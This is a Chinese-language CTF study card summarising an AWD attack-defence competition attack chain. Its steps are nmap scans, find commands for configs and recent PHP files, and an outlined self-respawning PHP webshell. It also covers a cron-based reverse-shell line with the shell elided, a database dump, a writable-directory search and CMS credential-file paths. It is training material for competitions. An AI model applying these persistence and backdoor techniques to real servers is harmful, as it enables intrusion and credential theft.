---
title: "AWD 比赛入门攻略总结"
category: web
tags: ["AWD 入门", "web", "nmap扫描", "nmap-sn", "nmap-sV", "nmap-sS"]
signals: ["AWD 入门 2022", "nmap扫描", "nmap-sn", "nmap-sV", "nmap-sS", "find配置文件", "不死马", "PHP webshell", "crontab 5分钟", "web_unknown", "AWD", "nmap", "find", "usleep"]
difficulty: easy
source: "https://www.ctfiot.com/30384.html"
tools: ["PHP", "nmap"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# AWD 比赛入门攻略总结

> 赛事：AWD 入门 2022 | 方向：web | 难度：easy | 工具：PHP、nmap

## 一句话总结

AWD 入门攻略 — nmap 扫存活+服务+端口 + find 配置文件 + 不死马 (usleep 5000) + crontab 5分钟反弹 + mysqldump + 找可写目录 + 找现有 webshell。

## 攻击链

1. nmap -sn 192.168.0.0/24 扫存活
2. nmap -sV 192.168.0.2 扫服务版本
3. nmap -sS -p 80,445 扫常用端口
4. find / -name "nginx.conf" 找 nginx
5. find /var/www/html -name *.php -mmin -20 看最近修改
6. 不死马: ignore_user_abort(true) + set_time_limit(0) + unlink(__FILE__) + while(1) file_put_contents + usleep(5000)
7. crontab 5 分钟反弹: echo "* * * * * echo ... shell" | crontab
8. mysqldump -u root -p password databasename > bak.sql
9. find / -type d -perm -002 找可写目录
10. find /var/www/html -name "*.php" | xargs grep "eval(" 找 webshell
11. 配置文件: DiscuzX2 \config\config_global.php + Wordpress \wp-config.php + DEDECMS5.7 \data\common.inc.php

## 关键 payload

```
nmap -sn/-sV/-sS / find -name *.conf / 不死马 file_put_contents 5000usleep / crontab 5分钟 / mysqldump / -perm -002 / eval( webshell 查找
```

## 经验教训

AWD 节奏是 1) 找后门 2) 写后门 3) 修后门 4) 拿 flag;不死马通过 usleep + while 循环 file_put_contents 防杀;crontab 5 分钟一轮是常见 scoring 周期;主流 CMS 配置路径要背熟。

## 标签

nmap扫描、nmap-sn、nmap-sV、nmap-sS、find配置文件、不死马、PHP webshell、crontab 5分钟、mysqldump、DEDECMS配置、Wordpress配置、DiscuzX配置、PHPCMS配置、端口关闭、find -mmin

## 参考来源

- https://www.ctfiot.com/30384.html
- 原文件：AWD比赛入门攻略总结.full.md
